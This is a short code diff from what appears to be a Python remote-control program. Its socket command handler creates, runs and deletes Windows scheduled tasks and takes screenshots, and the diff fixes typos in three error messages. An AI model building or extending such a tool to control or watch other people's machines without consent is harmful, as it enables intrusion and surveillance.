@@ -74,21 +74,21 @@ def socket_control():
 								if (create_task(data.split()[2],data.split()[3]) == True):
 									socket_server.send(encode("\nSuccessfully created schtask\n"))
 								else:
-									socket_server.send(encode("\Eroror during creation of schtask\n"))
+									socket_server.send(encode("\Error during creation of schtask\n"))
 							else:
 								pass
 							if (data.split()[1] == "run"):
 								if  (run_task(data.split()[2]) == True):
 									socket_server.send(encode("\nSuccessfully ran schtask\n"))
 								else:
-									socket_server.send(encode("\Eroror while running schtask\n"))
+									socket_server.send(encode("\Error while running schtask\n"))
 							else:
 								pass									
 							if (data.split()[1] == "delete"):
 								if  (del_task(data.split()[2]) == True):
 									socket_server.send(encode("\nSuccessfully deleted schtask\n"))
 								else:
-									socket_server.send(encode("\Eroror during deletion of schtask\n"))
+									socket_server.send(encode("\Error during deletion of schtask\n"))
 							else:
 								pass									
 						elif (data.split()[0] == "screenshot"):
